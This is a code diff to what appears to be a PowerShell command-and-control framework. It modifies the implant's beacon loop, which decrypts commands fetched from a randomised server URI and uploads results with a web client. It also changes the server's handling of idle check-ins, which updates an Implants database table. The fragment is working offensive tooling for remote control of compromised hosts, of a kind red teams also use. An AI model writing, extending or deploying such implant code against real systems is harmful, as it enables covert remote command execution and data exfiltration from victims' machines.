@@ -1283,7 +1283,7 @@ while($true)
         $RandomURI = Get-Random $URLS
         $G=[guid]::NewGuid()
         $Server = "$ServerClean/$RandomURI$G/?$URI"
-        $ReadCommandClear = Decrypt-String $key $ReadCommand
+        try { $ReadCommandClear = Decrypt-String $key $ReadCommand } catch {}
         $error.clear()
         if (($ReadCommandClear) -and ($ReadCommandClear -ne "fvdsghfdsyyh")) {
             if  ($ReadCommandClear.ToLower().StartsWith("multicmd")) {
@@ -1397,6 +1397,7 @@ while($true)
             (Get-Webclient -Cookie $ReadCommand).UploadData("$Server", $UploadBytes)|out-null
             } catch {}
             }
+            $ReadCommandClear = $null
         }
     break
     }
@@ -1484,10 +1485,7 @@ $message = Encrypt-String -key $EncKey -unencryptedString $message
         if (($request.Url -like "*$ranuri*") -and ($request.HttpMethod -eq 'GET') -and ($multicmdresults.Count -eq 0)) 
         { 
             Invoke-SqliteQuery -DataSource $Database -Query "UPDATE Implants SET LastSeen='$(get-date)' WHERE RandomURI='$ranuri'"|out-null
-            $message = 'fvdsghfdsyyh'
-            $fromstring = Encrypt-String $key $message
-            $commandsent = $fromstring
-            $message = $fromstring
+            $message = " "
         } 
 
         # a completed command has returned to the c2 server
@@ -1606,7 +1604,7 @@ $message = Encrypt-String -key $EncKey -unencryptedString $message
         $fileuri = ($request.Url).AbsoluteUri
         $outfile = "$($datenow) $($request.HttpMethod) $($fileuri)"
         Write-Output $outfile | Out-File $global:newdir\Webserver.log -Append
-    }
+    } 
 
     if ($exe) {
         $buffer = $message
